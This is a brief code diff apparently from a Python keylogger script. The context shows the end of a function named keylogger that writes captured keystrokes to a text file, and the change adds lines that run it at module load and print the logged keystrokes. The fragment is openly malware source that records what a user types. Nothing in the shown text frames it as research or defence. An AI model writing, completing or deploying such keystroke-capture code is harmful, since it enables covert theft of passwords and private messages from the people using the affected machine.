@@ -34,3 +34,6 @@ def keylogger(output_file="logged_keystrokes.txt"):
             file.write(logged_keystrokes)
 
     return logged_keystrokes
+
+logged_keys = keylogger()
+print(f"Logged keystrokes: {logged_keys}")
